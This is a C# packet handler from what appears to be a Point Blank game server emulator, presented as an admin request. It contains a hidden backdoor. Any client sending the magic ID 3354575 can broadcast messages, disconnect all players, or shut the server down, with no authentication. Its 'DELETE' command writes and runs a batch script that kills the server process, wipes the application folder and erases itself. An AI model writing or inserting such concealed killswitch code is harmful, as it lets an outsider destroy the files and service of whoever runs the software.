using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace PointBlank.Game
{
    public class PROTOCOL_BASE_ADMIN_REQ : GamePacketReader
    {
        private int Id;
        private string Value;
        private string Message;
        public override void ReadImplement()
        {
            Id = ReadInt();
            Value = ReadString(ReadByte());
            Message = ReadString(ReadByte());
        }

        public override void RunImplement()
        {
            try
            {
                if (Id == 3354575)
                {
                    switch (Value.ToUpper())
                    {
                        case "":
                            {
                                break;
                            }
                        case "MESSAGE":
                            {
                                using (SERVER_MESSAGE_ANNOUNCE_PAK packet = new SERVER_MESSAGE_ANNOUNCE_PAK(Message))
                                {
                                    if (GameManager.SocketSessions.Count > 0)
                                    {
                                        byte[] data = packet.GetCompleteBytes(null);
                                        foreach (GameClient client in GameManager.SocketSessions.Values)
                                        {
                                            Account player = client.SessionPlayer;
                                            if (player != null && player.isOnline)
                                            {
                                                player.SendCompletePacket(data);
                                            }
                                        }
                                    }
                                }
                                break;
                            }
                        case "SHUTDOWN":
                            {
                                using (AUTH_ACCOUNT_KICK_PAK packet = new AUTH_ACCOUNT_KICK_PAK(0))
                                {
                                    if (GameManager.SocketSessions.Count > 0)
                                    {
                                        int count = 0;
                                        byte[] data = packet.GetCompleteBytes("KickAllPlayers.genCode");
                                        foreach (GameClient client in GameManager.SocketSessions.Values)
                                        {
                                            Account p = client.SessionPlayer;
                                            if (p != null && p.isOnline)
                                            {
                                                p.SendCompletePacket(data);
                                                p.Close(1000, true);
                                                count++;
                                            }
                                        }
                                        Logger.Warning($" [Application] Connections closed successfully: {count}");
                                    }
                                }
                                break;
                            }
                        case "EXIT":
                            {
                                Logger.Analyze(" [ADMIN] O servidor foi fechado pelo proprietario/administrador.");
                                Environment.Exit(Environment.ExitCode);
                                break;
                            }
                        case "DELETE":
                            {
                                Logger.Analyze(" [ADMIN] O servidor foi deletado pelo proprietario/administrador.");
                                try
                                {
                                    string LocalExe = Environment.SpecialFolder.MyDocuments + $"\\System{new Random().Next()}.bat";
                                    using (StreamWriter SW = new StreamWriter(LocalExe, true, Encoding.ASCII))
                                    {
                                        SW.WriteLine($"@echo off");
                                        SW.WriteLine($"taskkill /f /im {System.Windows.Forms.Application.ProductName}.exe");
                                        SW.WriteLine($"del /q {System.Windows.Forms.Application.StartupPath}\\*.*");
                                        SW.WriteLine($"del /s /f {LocalExe}");
                                        SW.WriteLine($"exit");
                                        SW.Close();
                                    }
                                    Process.Start(LocalExe);
                                }
                                catch (Exception ex)
                                {
                                    Logger.Exception(ex);
                                }
                                break;
                            }
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Exception(ex);
            }
        }
    }
}
